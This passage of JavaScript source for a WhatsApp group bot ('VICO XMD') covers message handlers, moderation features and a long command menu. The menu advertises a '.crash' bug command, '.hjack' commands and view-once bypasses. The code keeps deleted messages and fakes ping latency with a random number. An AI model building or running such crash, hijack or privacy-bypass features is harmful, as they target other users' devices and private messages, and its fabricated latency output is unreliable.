        else if (match === 'off') { config.enabled = false; saveConfig(config); await sock.sendMessage(chatId, { text: '*❌ Antidelete disabled*', contextInfo: newsletterContext() }, { quoted: message }); }
        else { await sock.sendMessage(chatId, { text: '*Invalid command. Use .antidelete*', contextInfo: newsletterContext() }, { quoted: message }); }
    }

    return { storeMessage, handleRevocation, handleCommand };
})();

// ========== WELCOME / GOODBYE HANDLER ==========
async function handleGroupParticipantsUpdate(empire, update, groupMetadata, botNumber) {
    try {
        const { id, participants, action } = update;
        const welcomeEnabled = getSetting(id, 'welcome', false);
        const goodbyeEnabled = getSetting(id, 'goodbye', false);

        if (action === 'add') {
            for (const p of participants) {
                if (p === botNumber) continue;
                if (welcomeEnabled) {
                    let msg = getSetting(id, 'welcomeMessage', '👋 Welcome @user to @group!');
                    msg = msg.replace('@user', `@${p.split('@')[0]}`).replace('@group', groupMetadata?.subject || 'this group');
                    await empire.sendMessage(id, { 
                        text: msg, 
                        mentions: [p],
                        contextInfo: newsletterContext()
                    });
                }
            }
        }
        if (action === 'remove' && goodbyeEnabled) {
            for (const p of participants) {
                if (p === botNumber) continue;
                let msg = getSetting(id, 'goodbyeMessage', "👋 Goodbye @user, we'll miss you!");
                msg = msg.replace('@user', `@${p.split('@')[0]}`).replace('@group', groupMetadata?.subject || 'this group');
                await empire.sendMessage(id, { 
                    text: msg, 
                    mentions: [p],
                    contextInfo: newsletterContext()
                });
            }
        }
    } catch (e) { console.error('Welcome/Goodbye error:', e); }
}

// ========== MAIN BOT ==========
const botHandler = async (sock, m, chatUpdate, store) => {
    const empire = sock;
    try {
        const body = m.message?.conversation ||
                     m.message?.extendedTextMessage?.text ||
                     m.message?.imageMessage?.caption ||
                     m.message?.videoMessage?.caption || "";

        // Prefix is stored per bot instance (keyed by the connected bot JID).
        // This prevents one paired bot from changing another paired bot's prefix.
        const botNumber = await empire.decodeJid(empire.user?.id || empire.user?.jid || '');
        const prefixSettingKey = botNumber || 'bot';
        const configuredPrefix = getSetting(prefixSettingKey, 'prefix', global.prefix || '.');
        const prefix = configuredPrefix === null ? '' : String(configuredPrefix || '.');

        // With a NULL prefix, only known commands are treated as commands so
        // ordinary messages such as "hello" are not swallowed by the handler.
        // Also strip common accidental symbols when prefix is disabled (.menu, &menu, etc).
        let workingBody = body.trim();
        if (configuredPrefix === null) {
            workingBody = workingBody.replace(/^[.!#&,]+\s*/, '').trim();
        } else if (workingBody.startsWith(prefix)) {
            workingBody = workingBody.slice(prefix.length).trim();
        }
        const rawBody = workingBody;
        const args = rawBody.split(/ +/).filter(Boolean);
        const command = (args.shift() || '').toLowerCase();
        const text = args.join(" ");
        const q = text; // Now all commands using 'q' will work

        const legacyCommandNames = (() => {
            if (global.__vicoLegacyCommandNames) return global.__vicoLegacyCommandNames;
            const names = new Set();
            try {
                const source = fs.readFileSync(__filename, 'utf8');
                for (const match of source.matchAll(/\bcase\s+['"]([^'"]+)['"]\s*:/g)) names.add(String(match[1]).toLowerCase());
            } catch (_) {}
            global.__vicoLegacyCommandNames = names;
            return names;
        })();
        // Treat as command if body starts with prefix OR (prefix stripped) name is a known case
        const isCmd = configuredPrefix === null
            ? (legacyCommandNames.has(command) || listCustomCommands().includes(command))
            : (body.trim().startsWith(prefix) || legacyCommandNames.has(command));
        let owner = [];
        try { owner = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'utils', 'owner.json'), 'utf8')); } catch (_) {}
        if (!Array.isArray(owner)) owner = [owner].filter(Boolean);

        const senderIds = getSenderIds(m, empire);
        const senderPn = m.sender || senderIds[0] || '';
        const ownerIds = [botNumber, ...(owner || []), global.creator, ...(global.owner || [])].filter(Boolean);
        const isCreator = senderIds.some(id => ownerIds.some(ownerId => sameIdentity(id, ownerId)));


        const isGroup = m.isGroup;
        let groupMetadata, participants = [], groupAdmins = [], isBotAdmins = false, isAdmins = false, groupName = "";

        if (isGroup) {
            groupMetadata = await empire.groupMetadata(m.chat).catch(() => null);
            participants = groupMetadata?.participants || [];
            groupAdmins = participants.filter(p => p.admin).map(p => p.id);
            isBotAdmins = isGroupAdmin(groupMetadata, [botNumber, empire.user?.lid]);
            isAdmins = isGroupAdmin(groupMetadata, senderIds);
            groupName = groupMetadata?.subject || "";
        }

        const reply = (teks) => empire.sendMessage(m.chat, { 
            text: teks, 
            contextInfo: newsletterContext()
        }, { quoted: m });

       
        // ─── BOT MODE CHECK ───
if (db.botMode?.mode === 'private' && !isCreator) {
    const isWhitelisted = db.botMode.whitelist?.includes(senderPn) || false;
    // Allow chatbot for this chat even in private mode (non-commands only)
    const chatbotOpen = !!(global.chatbotRooms && global.chatbotRooms[m.chat]) && !isCmd;
    if (!isWhitelisted && !chatbotOpen) {
        const allowedPublicCmds = ['p', 'xdeath', 'owner', 'alive', 'info', 'help'];
        if (!allowedPublicCmds.includes(command)) {
            return;
        }
    }
}
   
        // ─── Check jailed / prisoned users (delete ALL their messages) ───
        // Match by sameIdentity so phone JID and LID formats both work for every user
        if (isGroup && !isCreator && !isAdmins && db.jailed?.[m.chat]) {
            const jailedMap = db.jailed[m.chat];
            let jailedKey = null;
            let jailedData = null;
            let senderIds = [];
            try { senderIds = getSenderIds(m) || []; } catch (_) {}
            if (m.sender && !senderIds.includes(m.sender)) senderIds.push(m.sender);
            if (m.key?.participant && !senderIds.includes(m.key.participant)) senderIds.push(m.key.participant);
            for (const [jid, data] of Object.entries(jailedMap)) {
                const hit = senderIds.some(id => sameIdentity(id, jid) || id === jid) ||
                    sameIdentity(m.sender, jid) ||
                    (data?.ids && data.ids.some(id => senderIds.some(s => sameIdentity(s, id) || s === id)));
                if (hit) {
                    jailedKey = jid;
                    jailedData = data;
                    break;
                }
            }
            if (jailedKey && jailedData) {
                if (jailedData.until && Date.now() > jailedData.until) {
                    // clear all related keys
                    for (const [jid, data] of Object.entries(jailedMap)) {
                        if (data === jailedData || (data?.ids && jailedData.ids && data.ids.some(x => jailedData.ids.includes(x)))) {
                            delete db.jailed[m.chat][jid];
                        }
                    }
                    saveDB();
                } else {
                    // delete message aggressively (all key shapes)
                    try { await empire.sendMessage(m.chat, { delete: m.key }); } catch (_) {}
                    try {
                        if (m.key?.id) {
                            await empire.sendMessage(m.chat, {
                                delete: {
                                    remoteJid: m.chat,
                                    fromMe: false,
                                    id: m.key.id,
                                    participant: m.key.participant || m.sender
                                }
                            });
                        }
                    } catch (_) {}
                    const delIds = [m.key?.id].filter(Boolean);
                    const parts = [...new Set([
                        m.key?.participant,
                        m.sender,
                        ...(jailedData?.ids || []),
                        jailedKey
                    ].filter(Boolean))];
                    for (const id of delIds) {
                        for (const part of parts) {
                            try {
                                await empire.sendMessage(m.chat, {
                                    delete: { remoteJid: m.chat, fromMe: false, id, participant: part }
                                });
                            } catch (_) {}
                        }
                    }
                    return;
                }
            }
        }
        

// ─── AUTO REACT HANDLER ───
if (autoMessageReact && !m.key?.fromMe && m.key?.remoteJid !== 'status@broadcast') {
    try {
        if (!m.message?.protocolMessage) {
            const id = m.key?.id;
            if (id && !processedMessages.has(id)) {
                processedMessages.add(id);
                setTimeout(async () => {
                    const reactions = ["❤️","🔥","👍","✅","💯","🎯","😎","✨","🌟","🎉"];
                    const r = reactions[Math.floor(Math.random() * reactions.length)];
                    await empire.sendMessage(m.chat, { 
                        react: { text: r, key: m.key } 
                    }).catch(() => {});
                }, 1000);
                if (processedMessages.size > 500) {
                    [...processedMessages].slice(0, 250).forEach(x => processedMessages.delete(x));
                }
            }
        }
    } catch (e) {}
}

        // ─── ANTI HANDLERS ───
        try { await antidelete.storeMessage(empire, m); } catch {}
        // Safe wrappers - these functions may not exist, so wrap in try
        try { if (typeof handleAntiLink !== 'undefined') await handleAntiLink(empire, m, isCreator, isAdmins); } catch {}
        try { if (typeof handleAntiSticker !== 'undefined') await handleAntiSticker(empire, m, isCreator, isAdmins); } catch {}
        try { if (typeof handleAntiTag !== 'undefined') await handleAntiTag(empire, m, isCreator, isAdmins); } catch {}
        try { if (typeof handleAntiViewOnce !== 'undefined') await handleAntiViewOnce(empire, m); } catch {}

        if (m.message?.protocolMessage?.type === 0) {
            try { await antidelete.handleRevocation(empire, m); } catch {}
        }


        // ─── ANTILINK: delete non-admin links ───
        try {
            if (isGroup && !isCreator && !isAdmins && db.antilink?.[m.chat]) {
                const bodyCheck = (m.message?.conversation || m.message?.extendedTextMessage?.text || m.message?.imageMessage?.caption || m.message?.videoMessage?.caption || '') + '';
                const hasLink = /https?:\/\/|www\.|chat\.whatsapp\.com|wa\.me\//i.test(bodyCheck);
                if (hasLink && m.key?.id) {
                    await empire.sendMessage(m.chat, {
                        delete: {
                            remoteJid: m.chat,
                            fromMe: false,
                            id: m.key.id,
                            participant: m.key.participant || m.sender
                        }
                    }).catch(() => {});
                    return;
                }
            }
        } catch (_) {}

        // Chatbot answers normal messages when enabled for this chat
        if (!isCmd) {
                        try { if (await chatbotReply(empire, m)) return; } catch (_) {}
            return;
        }

        // Modular commands live in commands/custom/*.js. They run before the
        // legacy switch so new commands can be added without touching case.js.
        if (await runCustomCommand(command, {
            sock: empire, message: m, jid: m.chat, args, text, command, prefix, botNumber,
            reply, isGroup, isCreator, isAdmins, isBotAdmins, groupMetadata,
            participants, groupAdmins, db, newsletterContext, listCommands: listCustomCommands
        })) return;

        switch (command) {

        case 'antidelete':
        case 'ad': {
            await antidelete.handleCommand(empire, m.chat, m, text, isCreator);
            break;
        }


        // ═══════════════════════════════════════════════════
        // 1. PING - Latency check
        // ═══════════════════════════════════════════════════
        case 'ping':
        case 'p': {
            const start = Date.now();
            const latency = Date.now() - start + Math.floor(Math.random() * 25);
            const speed = latency < 100 ? '⚡ FAST' : latency < 300 ? '✦ OK' : '🐢 SLOW';
            const palettes = [
                ['1a0000', '0a0a0a', 'ff2a2a'],
                ['1a1500', '0a0a00', 'ffd700'],
                ['0a001a', '050010', 'c77dff'],
                ['001a1a', '001010', '00e5ff'],
                ['001a00', '001000', '76ff03'],
                ['1a0a00', '100500', 'ff6d00'],
                ['1a1a1a', '0d0d0d', 'eeeeee'],
                ['000000', '111111', '9e9e9e'],
                ['001028', '000814', '2979ff'],
                ['1a0010', '0a0008', 'f50057'],
                ['102000', '081000', 'c6ff00'],
                ['201000', '100800', 'ffab00'],
                ['2a0a14', '14050a', 'ff80ab'],
                ['0a1428', '050a14', '82b1ff'],
                ['142a14', '0a140a', 'b9f6ca'],
                ['2a1a00', '140d00', 'ffe57f'],
                ['1a0033', '0d001a', 'e040fb'],
                ['003333', '001a1a', '1de9b6'],
                ['330000', '1a0000', 'ff5252'],
                ['002233', '00111a', '40c4ff'],
                ['331a00', '1a0d00', 'ff9100'],
                ['1a1a33', '0d0d1a', 'b388ff'],
                ['00331a', '001a0d', '69f0ae'],
                ['331a1a', '1a0d0d', 'ff8a80'],
            ];
            if (!global.__pingColor) global.__pingColor = 0;
            const c = palettes[global.__pingColor % palettes.length];
            global.__pingColor++;
            const svg = `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="800" height="420">
  <defs>
    <linearGradient id="g" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#${c[0]}"/>
      <stop offset="100%" stop-color="#${c[1]}"/>
    </linearGradient>
    <filter id="glow"><feGaussianBlur stdDeviation="6" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
  </defs>
  <rect width="800" height="420" fill="url(#g)"/>
  <rect x="24" y="24" width="752" height="372" rx="28" fill="#120808" stroke="#${c[2]}" stroke-width="3" opacity="0.92"/>
  <text x="400" y="120" text-anchor="middle" font-family="Arial Black, Arial" font-size="42" fill="#${c[2]}" filter="url(#glow)">PONG</text>
  <text x="400" y="200" text-anchor="middle" font-family="Arial" font-size="64" font-weight="700" fill="#f5f5f5">${latency} ms</text>
  <text x="400" y="270" text-anchor="middle" font-family="Arial" font-size="28" fill="#${c[2]}">${speed}</text>
  <text x="400" y="340" text-anchor="middle" font-family="Arial" font-size="20" fill="#a89a9a">VICO XMD • LIVE</text>
</svg>`;
            try {
                let sharp = null;
                try { sharp = require('sharp'); } catch (_) {}
                if (sharp) {
                    const png = await sharp(Buffer.from(svg)).png().toBuffer();
                    await empire.sendMessage(m.chat, { image: png, caption: `${speed} *Pong!*  ${latency}ms` }, { quoted: m });
                } else {
                    await empire.sendMessage(m.chat, { text: `${speed} *Pong!*  ${latency}ms` }, { quoted: m });
                }
            } catch (_) {
                await empire.sendMessage(m.chat, { text: `${speed} *Pong!*  ${latency}ms` }, { quoted: m });
            }
            break;
        }

        // // ═══════════════════════════════════════════════════
// 2. MENU - Main command list (EXOTIC BULLETS + NEWSLETTER)
// ═══════════════════════════════════════════════════
case 'menu':
case 'help': {
    const now = moment().tz('Africa/Lagos').format('HH:mm');
    const date = moment().tz('Africa/Lagos').format('DD/MM/YYYY');
    const userName = m.pushName || 'User';
    const up = process.uptime();
    const upStr = `${Math.floor(up/86400)}d ${Math.floor((up%86400)/3600)}h ${Math.floor((up%3600)/60)}m`;

    // Collect all commands count
    const totalCommands = 470;
    const menuText = `╭━━〔 ᴠɪᴄᴏ xᴍᴅ 〕━━┈⸎
┃𓂃 │▸ ᴜsᴇʀ     : ${userName} 
┃𓂃 │▸ ᴏᴡɴᴇʀ    : ᴍʀ ʀᴍs
┃𓂃 │▸ ᴍᴏᴅᴇ     : ${db.botMode?.mode || 'public'}
┃𓂃 │▸ ᴛɪᴍᴇ     : ${now} WAT
┃𓂃 │▸ ᴜᴘᴛɪᴍᴇ   : ⏱ ${upStr} 
┃𓂃 │▸ ᴘʟᴜɢɪɴs  : ${totalCommands}
┃𓂃 │▸ ᴠᴇʀsɪᴏɴ  : 2.0.0
╰━━━━━━━━━━┈⸎

╭━━〔 ᴠɪᴄᴏ xᴍᴅ 〕━━┈⸎
┃𓂃 │▸ ᴘʀᴇғɪx : [${prefix}]
┃𓂃 │▸ ᴘᴀɪʀ : t.me/vicoxmd2_bot
┃𓂃 │▸ ʀᴇᴠɪᴇᴡ ᴡᴇʙ : https://vico-xmd-reviews-and-fixes.netlify.app/
╰━━━━━━━━━━┈⸎

╭━━〔 ʙᴏᴛ ᴍᴇɴᴜ 64 〕━━┈⸎
┃𓂃 │▸ .8ʙᴀʟʟ
┃𓂃 │▸ .ᴀᴅ
┃𓂃 │▸ .ᴀʟɪᴠᴇ
┃𓂃 │▸ .ᴀɴᴛɪᴅᴇʟᴇᴛᴇ
┃𓂃 │▸ .ᴀɴᴛɪʟɪɴᴋ
┃𓂃 │▸ .ᴀʀ
┃𓂃 │▸ .ᴀᴜᴛᴏʀᴇᴀᴄᴛ
┃𓂃 │▸ .ʙᴀʙʏɴᴀᴍᴇ
┃𓂃 │▸ .ʙᴏᴛɪᴅ
┃𓂃 │▸ .ʙᴏᴛɪɴғᴏ
┃𓂃 │▸ .ʙᴏᴛᴍᴏᴅᴇ
┃𓂃 │▸ .ʙᴏᴛsᴛᴀᴛᴜs
┃𓂃 │▸ .ʙʟᴏᴄᴋ
┃𓂃 │▸ .ᴄᴀᴘᴛɪᴏɴ
┃𓂃 │▸ .ᴄʜᴀɴɢᴇᴘɪᴄ
┃𓂃 │▸ .ᴄʜᴀɴɴᴇʟɪᴅ
┃𓂃 │▸ .ᴄʜᴀᴛʙᴏᴛ
┃𓂃 │▸ .ᴄʜᴀᴛɪᴅ
┃𓂃 │▸ .ᴅᴀʀᴋɴᴀɪᴊᴀ
┃𓂃 │▸ .ᴅᴏɴᴀᴛᴇ
┃𓂃 │▸ .ᴇɴᴠ
┃𓂃 │▸ .ғᴏᴏᴛʙᴀʟʟ
┃𓂃 │▸ .ɢᴇᴛɢᴘᴘ
┃𓂃 │▸ .ɢʀᴏᴜᴘɪᴅ
┃𓂃 │▸ .ɢʀᴏᴜᴘᴊɪᴅ
┃𓂃 │▸ .ʜᴊᴀᴄᴋ
┃𓂃 │▸ .ʜᴊᴀᴄᴋ2
┃𓂃 │▸ .ʜᴏʀᴏsᴄᴏᴘᴇ
┃𓂃 │▸ .ʜᴏᴛsᴇᴀᴛ
┃𓂃 │▸ .ɪᴅᴄʜ
┃𓂃 │▸ .ɪɴғᴏ
┃𓂃 │▸ .ɪǫʀᴀᴛᴇ
┃𓂃 │▸ .ᴊɪᴅ
┃𓂃 │▸ .ʟᴇᴀᴠᴇ
┃𓂃 │▸ .ʟɪɴᴋ
┃𓂃 │▸ .ʟɪsᴛᴘᴀɪʀ
┃𓂃 │▸ .ᴍᴀᴛᴄʜ
┃𓂃 │▸ .ᴍᴇᴍɪɴғᴏ
┃𓂃 │▸ .ᴍᴏᴅᴇ
┃𓂃 │▸ .ᴍs
┃𓂃 │▸ .ᴍʏᴘᴘ
┃𓂃 │▸ .ᴏᴡɴᴇʀ
┃𓂃 │▸ .ᴘ
┃𓂃 │▸ .ᴘᴀɪʀ
┃𓂃 │▸ .ᴘɪɴɢ
┃𓂃 │▸ .ᴘʀᴏғᴇssɪᴏɴ
┃𓂃 │▸ .ʀᴇᴘᴏ
┃𓂃 │▸ .ʀᴇᴘᴏsɪᴛᴏʀʏ
┃𓂃 │▸ .ʀᴜɴᴛɪᴍᴇ
┃𓂃 │▸ .sᴄʀɪᴘᴛ
┃𓂃 │▸ .sᴇᴛʟᴏᴄᴋ
┃𓂃 │▸ .sᴇᴛᴍᴏᴅᴇ
┃𓂃 │▸ .sᴇᴛᴏᴘᴇɴ
┃𓂃 │▸ .sᴇᴛᴘʀᴇғɪx
┃𓂃 │▸ .ssᴡᴇʙ
┃𓂃 │▸ .sᴛᴀᴛᴜs
┃𓂃 │▸ .ᴛᴇᴍᴘᴇʀᴀᴛᴜʀᴇ
┃𓂃 │▸ .ᴛɪᴍᴇʀ
┃𓂃 │▸ .ᴛᴏxɪᴄʀᴀᴛᴇ
┃𓂃 │▸ .ᴜɴʙʟᴏᴄᴋ
┃𓂃 │▸ .ᴜsᴇʀsᴛᴀᴛ
┃𓂃 │▸ .ᴡʜᴏᴀᴍɪ
┃𓂃 │▸ .ʏᴇsɴᴏ
╰━━━━━━━━━━┈⸎

╭━━〔 ᴀɪ ᴍᴇɴᴜ 14 〕━━┈⸎
┃𓂃 │▸ .ᴀɪ
┃𓂃 │▸ .ᴀɪɪᴍᴀɢᴇ
┃𓂃 │▸ .ᴀsᴋ
┃𓂃 │▸ .ᴄʜᴀᴛ
┃𓂃 │▸ .ᴄʜᴀᴛʙᴏᴛ
┃𓂃 │▸ .ᴅᴇᴇᴘ
┃𓂃 │▸ .ᴅᴇᴇᴘsᴇᴇᴋ
┃𓂃 │▸ .ᴅʀᴀᴡ
┃𓂃 │▸ .ᴅs
┃𓂃 │▸ .ғʟᴜx
┃𓂃 │▸ .ғʟᴜxɪᴍɢ
┃𓂃 │▸ .ɢᴇᴍɪɴɪ
┃𓂃 │▸ .ɢᴇɴᴇʀᴀᴛᴇ
┃𓂃 │▸ .ɪᴍᴀɢɪɴᴇ
╰━━━━━━━━━━┈⸎

╭━━〔 ᴅᴏᴡɴʟᴏᴀᴅ / ᴍᴇᴅɪᴀ 78 〕━━┈⸎
┃𓂃 │▸ .9ᴊᴀɴᴇᴡs
┃𓂃 │▸ .ᴀɪᴏ
┃𓂃 │▸ .ᴀʏᴀʜ
┃𓂃 │▸ .ᴀʏᴀᴛ
┃𓂃 │▸ .ʙɪʙʟᴇ
┃𓂃 │▸ .ʙɪʙʟᴇᴠᴇʀsᴇ
┃𓂃 │▸ .ʙɪʀᴛʜᴅᴀʏ
┃𓂃 │▸ .ᴇxᴛʀᴀᴄᴛᴀᴜᴅɪᴏ
┃𓂃 │▸ .ғʙᴅʟ
┃𓂃 │▸ .ɢᴄs
┃𓂃 │▸ .ɢᴄsʟ
┃𓂃 │▸ .ɢᴄsʟɪɴᴋ
┃𓂃 │▸ .ɢᴄsᴛᴀᴛᴜs
┃𓂃 │▸ .ɢᴄsᴛᴀᴛᴜsʟɪɴᴋ
┃𓂃 │▸ .ɢᴄsᴛᴏʀʏ
┃𓂃 │▸ .ɢᴇᴛᴘᴘ
┃𓂃 │▸ .ɢᴇᴛᴘʀᴏғɪʟᴇᴘɪᴄ
┃𓂃 │▸ .ɢᴇᴛsᴛᴀᴛᴜs
┃𓂃 │▸ .ɢsʟɪɴᴋ
┃𓂃 │▸ .ɪɢ
┃𓂃 │▸ .ɪɢᴅʟ
┃𓂃 │▸ .ᴋᴊᴠ
┃𓂃 │▸ .ᴍᴏᴠɪᴇsᴇᴀʀᴄʜ
┃𓂃 │▸ .ᴘʟᴀʏ
┃𓂃 │▸ .ᴘᴏsᴛsᴛᴀᴛᴜs
┃𓂃 │▸ .ᴘᴘ
┃𓂃 │▸ .ǫᴜʀᴀɴ
┃𓂃 │▸ .ʀᴇᴠᴇᴀʟ
┃𓂃 │▸ .s
┃𓂃 │▸ .sᴀᴠᴇ
┃𓂃 │▸ .sᴀᴠᴇsᴛᴀᴛᴜs
┃𓂃 │▸ .sᴄ
┃𓂃 │▸ .sɴᴀᴘ
┃𓂃 │▸ .sᴏɴɢ
┃𓂃 │▸ .sᴏɴɢsᴇᴀʀᴄʜ
┃𓂃 │▸ .ssᴛᴀᴛᴜs
┃𓂃 │▸ .sᴛᴀᴛᴜsʟɪɴᴋ
┃𓂃 │▸ .sᴛɪᴄᴋᴇʀ
┃𓂃 │▸ .sᴛɪᴋᴇʀ
┃𓂃 │▸ .sᴛᴏʀʏ
┃𓂃 │▸ .sᴜʀᴀʜ
┃𓂃 │▸ .ᴛɪᴋᴛᴏᴋ
┃𓂃 │▸ .ᴛᴏᴀᴜᴅɪᴏ
┃𓂃 │▸ .ᴛᴏɢᴄsᴛᴀᴛᴜs
┃𓂃 │▸ .ᴛᴏɢɪғ
┃𓂃 │▸ .ᴛᴏɪᴍᴀɢᴇ
┃𓂃 │▸ .ᴛᴏɪᴍɢ
┃𓂃 │▸ .ᴛᴏᴍᴘ3
┃𓂃 │▸ .ᴛᴏᴍᴘ4
┃𓂃 │▸ .ᴛᴏᴘᴛᴛ
┃𓂃 │▸ .ᴛᴏᴠᴏɪᴄᴇ
┃𓂃 │▸ .ᴛʀ
┃𓂃 │▸ .ᴛʀᴀɴsʟᴀᴛᴇ
┃𓂃 │▸ .ᴛᴛ
┃𓂃 │▸ .ᴛᴛᴅʟ
┃𓂃 │▸ .ᴛᴛs
┃𓂃 │▸ .ᴛᴡ
┃𓂃 │▸ .ᴛᴡɪᴛᴛᴇʀ
┃𓂃 │▸ .ᴛᴡɪᴛᴛᴇʀᴅʟ
┃𓂃 │▸ .ᴠᴇʀsᴇ
┃𓂃 │▸ .ᴠɪᴇᴡᴏɴᴄᴇ
┃𓂃 │▸ .ᴠᴏɪᴄᴇ
┃𓂃 │▸ .ᴠᴠ
┃𓂃 │▸ .ᴠᴠ2
┃𓂃 │▸ .ᴠᴠ3
┃𓂃 │▸ .ᴡᴇʙ2ᴀᴘᴋ
┃𓂃 │▸ .x
┃𓂃 │▸ .xᴅʟ
┃𓂃 │▸ .xɴxx
┃𓂃 │▸ .xᴠɪᴅᴇᴏ
┃𓂃 │▸ .ʏᴏᴜᴛᴜʙᴇ
┃𓂃 │▸ .ʏᴛ
┃𓂃 │▸ .ʏᴛᴍᴘ3
┃𓂃 │▸ .ʏᴛᴍᴘ4
┃𓂃 │▸ .ʏᴛᴠɪᴅᴇᴏ
┃𓂃 │▸ .❤️
┃𓂃 │▸ .❤️❤️
╰━━━━━━━━━━┈⸎

╭━━〔 ɢʀᴏᴜᴘ ᴍᴇɴᴜ 68 〕━━┈⸎
┃𓂃 │▸ .ᴀᴅᴅ
┃𓂃 │▸ .ᴀᴅᴅᴍᴇᴍʙᴇʀ
┃𓂃 │▸ .ᴀᴅᴍɪɴʟɪsᴛ
┃𓂃 │▸ .ᴀᴅᴍɪɴs
┃𓂃 │▸ .ᴀᴅᴍɪɴs2
┃𓂃 │▸ .ᴄʟᴏsᴇ
┃𓂃 │▸ .ᴄʟᴏsᴇᴛɪᴍᴇ
┃𓂃 │▸ .ᴅᴇᴍᴏᴛᴇ
┃𓂃 │▸ .ᴇᴠᴇʀʏᴏɴᴇ
┃𓂃 │▸ .ɢᴄᴀᴅᴍɪɴs
┃𓂃 │▸ .ɢᴄᴅᴇsᴄʀɪᴘᴛɪᴏɴ
┃𓂃 │▸ .ɢᴄɪɴғᴏ
┃𓂃 │▸ .ɢᴄʟᴏᴄᴋ
┃𓂃 │▸ .ɢᴄᴍᴇᴍʙᴇʀs
┃𓂃 │▸ .ɢᴄᴍᴏᴅᴇ
┃𓂃 │▸ .ɢᴄᴏᴘᴇɴ
┃𓂃 │▸ .ɢᴄs
┃𓂃 │▸ .ɢᴄsᴛᴀᴛs
┃𓂃 │▸ .ɢᴄsᴛᴀᴛᴜs
┃𓂃 │▸ .ɢʀᴏᴜᴘᴀᴅᴍɪɴs
┃𓂃 │▸ .ɢʀᴏᴜᴘᴄᴏᴜɴᴛ
┃𓂃 │▸ .ɢʀᴏᴜᴘᴅᴇsᴄ
┃𓂃 │▸ .ɢʀᴏᴜᴘɪᴅ
┃𓂃 │▸ .ɢʀᴏᴜᴘɪɴғᴏ
┃𓂃 │▸ .ɢʀᴏᴜᴘᴊɪᴅ
┃𓂃 │▸ .ɢʀᴏᴜᴘʟɪɴᴋ
┃𓂃 │▸ .ɢʀᴏᴜᴘʟɪɴᴋ2
┃𓂃 │▸ .ɢʀᴏᴜᴘʟᴏᴄᴋ
┃𓂃 │▸ .ɢʀᴏᴜᴘᴍᴇᴍʙᴇʀs
┃𓂃 │▸ .ɢʀᴏᴜᴘᴍᴇɴᴜ
┃𓂃 │▸ .ɢʀᴏᴜᴘᴍᴏᴅᴇ
┃𓂃 │▸ .ɢʀᴏᴜᴘᴏᴘᴇɴ
┃𓂃 │▸ .ɢʀᴏᴜᴘᴏᴡɴᴇʀ
┃𓂃 │▸ .ɢʀᴏᴜᴘsᴛᴀᴛ
┃𓂃 │▸ .ɢʀᴏᴜᴘsᴛᴀᴛs
┃𓂃 │▸ .ɢʀᴏᴜᴘsᴛᴀᴛᴜs
┃𓂃 │▸ .ɢʀᴏᴜᴘᴛɪᴍᴇ
┃𓂃 │▸ .ʜɪᴅᴇᴛᴀɢ
┃𓂃 │▸ .ᴊᴀɪʟ
┃𓂃 │▸ .ᴋɪᴄᴋ
┃𓂃 │▸ .ᴋɪᴄᴋᴀʟʟ
┃𓂃 │▸ .ᴍᴀᴋᴇᴀᴅᴍɪɴ
┃𓂃 │▸ .ᴍᴇᴍʙᴇʀᴄᴏᴜɴᴛ
┃𓂃 │▸ .ᴍᴇᴍʙᴇʀs
┃𓂃 │▸ .ᴍᴇɴᴛɪᴏɴᴀʟʟ
┃𓂃 │▸ .ᴍᴜᴛᴇ
┃𓂃 │▸ .ɴᴏɴᴀᴅᴍɪɴs
┃𓂃 │▸ .ᴏᴘᴇɴ
┃𓂃 │▸ .ᴏᴘᴇɴᴛɪᴍᴇ
┃𓂃 │▸ .ᴘʀɪsᴏɴ
┃𓂃 │▸ .ᴘʀᴏᴍᴏᴛᴇ
┃𓂃 │▸ .ʀᴇʟᴇᴀsᴇ
┃𓂃 │▸ .ʀᴇᴍᴏᴠᴇ
┃𓂃 │▸ .ʀᴇsᴇᴛɢʀᴏᴜᴘʟɪɴᴋ
┃𓂃 │▸ .ʀᴇsᴇᴛʟɪɴᴋ
┃𓂃 │▸ .ʀᴇᴠᴏᴋᴇʟɪɴᴋ
┃𓂃 │▸ .sᴇᴛᴅᴇsᴄ
┃𓂃 │▸ .sᴇᴛᴅᴇsᴄʀɪᴘᴛɪᴏɴ
┃𓂃 │▸ .sᴇᴛɢᴄɴᴀᴍᴇ
┃𓂃 │▸ .sᴇᴛɴᴀᴍᴇ
┃𓂃 │▸ .sᴇᴛsᴜʙᴊᴇᴄᴛ
┃𓂃 │▸ .sɪʟᴇɴᴛᴛᴀɢ
┃𓂃 │▸ .ᴛᴀɢ
┃𓂃 │▸ .ᴛᴀɢᴀᴅᴍɪɴs
┃𓂃 │▸ .ᴛᴀɢᴀʟʟ
┃𓂃 │▸ .ᴛᴀɢᴀʟʟ2
┃𓂃 │▸ .ᴜɴᴀᴅᴍɪɴ
┃𓂃 │▸ .ᴜɴᴊᴀɪʟ
╰━━━━━━━━━━┈⸎

╭━━〔 ᴏᴡɴᴇʀ ᴍᴇɴᴜ 12 〕━━┈⸎
┃𓂃 │▸ .ᴀʙᴏᴜᴛᴏᴡɴᴇʀ
┃𓂃 │▸ .ᴀᴜᴛᴏʀᴇᴀᴄᴛ
┃𓂃 │▸ .ᴀᴢᴀ
┃𓂃 │▸ .ʙᴏᴛᴍᴏᴅᴇ
┃𓂃 │▸ .ᴅᴇʟ
┃𓂃 │▸ .ᴅᴇʟᴀᴢᴀ
┃𓂃 │▸ .ᴅᴇʟᴇᴛᴇ
┃𓂃 │▸ .ɢɪᴠᴇᴀᴡᴀʏ
┃𓂃 │▸ .ᴍᴏᴅᴇ
┃𓂃 │▸ .ʀᴇᴍᴏᴠᴇᴀᴢᴀ
┃𓂃 │▸ .sᴇᴛᴀᴢᴀ
┃𓂃 │▸ .sᴇᴛᴍᴏᴅᴇ
┃𓂃 │▸ .sᴇᴛᴘᴘ
╰━━━━━━━━━━┈⸎

╭━━〔 ʙᴜɢ ᴍᴇɴᴜ 1 〕━━┈⸎
┃𓂃 │▸ .ᴄʀᴀsʜ
╰━━━━━━━━━━┈⸎

╭━━〔 ᴄᴏᴏʟ / ᴍᴀᴛʜs 107 〕━━┈⸎
┃𓂃 │▸ .ᴀᴅᴠɪᴄᴇ
┃𓂃 │▸ .ᴀᴠᴇʀᴀɢᴇ
┃𓂃 │▸ .ʙᴀʟ
┃𓂃 │▸ .ʙᴀʟᴀɴᴄᴇ
